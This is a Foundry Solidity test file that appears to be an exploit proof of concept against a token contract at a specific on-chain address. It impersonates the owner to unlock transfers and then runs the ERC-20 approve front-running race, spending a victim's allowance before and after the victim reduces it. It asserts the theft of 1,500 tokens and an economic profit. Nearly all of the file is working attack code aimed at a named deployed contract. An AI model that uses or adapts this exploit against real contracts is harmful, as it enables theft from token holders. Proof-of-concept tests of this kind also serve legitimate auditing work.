// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    BNRG public token;
    address public victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = BNRG(TARGET);

        // Create a victim user and fund them with BNRG tokens
        victim = makeAddr("victim");
        deal(TARGET, victim, 2000 * 1e18);

        // The contract starts in a "Locked" state, which prevents transfers.
        // We must impersonate the owner to call setBotProtection(false) to unlock it.
        address owner = token.owner();
        vm.startPrank(owner);
        token.setBotProtection(false); // Sets state to Unlocked
        vm.stopPrank();

        // Verify initial balances
        assertEq(token.balanceOf(attacker), 0);
        assertEq(token.balanceOf(victim), 2000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        uint256 initialApprovalAmount = 1000 * 1e18;
        uint256 reducedApprovalAmount = 500 * 1e18;

        // Step 1: The victim approves the attacker for an initial amount.
        vm.startPrank(victim);
        token.approve(attacker, initialApprovalAmount);
        vm.stopPrank();

        assertEq(token.allowance(victim, attacker), initialApprovalAmount);

        // --- RACE CONDITION BEGINS ---

        // Step 2: Attacker front-runs the approval-reducing transaction.
        // The attacker spends the initial allowance *before* the victim can reduce it.
        token.transferFrom(victim, attacker, initialApprovalAmount);

        // Step 3: The victim's transaction to reduce the allowance is now "mined".
        vm.startPrank(victim);
        token.approve(attacker, reducedApprovalAmount);
        vm.stopPrank();

        // --- RACE CONDITION ENDS ---

        // Step 4: The attacker can now spend the new allowance as well.
        token.transferFrom(victim, attacker, reducedApprovalAmount);

        // Verify that the attacker has stolen both amounts.
        uint256 totalStolen = initialApprovalAmount + reducedApprovalAmount;
        assertEq(token.balanceOf(attacker), totalStolen);
        uint256 finalBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

